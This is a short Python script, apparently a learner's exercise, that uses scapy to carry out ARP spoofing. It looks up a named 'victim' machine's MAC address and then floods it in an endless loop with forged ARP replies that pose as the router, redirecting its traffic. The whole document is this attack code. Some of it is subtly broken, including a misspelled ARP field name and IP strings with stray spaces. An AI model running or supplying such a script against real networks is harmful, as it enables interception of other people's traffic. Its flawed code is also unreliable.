import scapy.all as scapy

# ip of the router
gateway_ip ="192.168.0.1 "
# the ip of victim
target_ip =" 192.168.0.174"

# spoof_ip(addres of gateway) - if the victim will go to internet, he wouldnt go to internet,however he will go to my ip_adrr
def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packed = scapy.ARP(pdst=target_ip, hwst=target_mac, psrc=spoof_ip, op="is-at") # we are bilding the ARP packet
    scapy.send(spoofed_arp_packed, verbose=0)

#function that finds the MAC addresses for the IP (in local network)
def get_mac(ip):
    #--> we want to send request in the local network so we need broadcast(dst="ff:ff:ff:ff:ff:ff)
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) # with "/" we connect arp packetes
    # srp- send and receive packet
    reply, smth = scapy.srp(arp_request,timeout= 3,verbose= 0) # verbose =0 - it willnot print all the messages on the way
    if reply != None:
        # if there is answer we return the mac address
        return reply[0][-1].src
    return None


target_mac = None
while not target_mac: # while target_mac ==None
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("MAC addresess for TARGET NOT found")
print("Target MAC is:{}".format(target_mac))

while True:
    spoof(target_ip, target_mac,gateway_ip)
    print("Spoofing is atcive!")

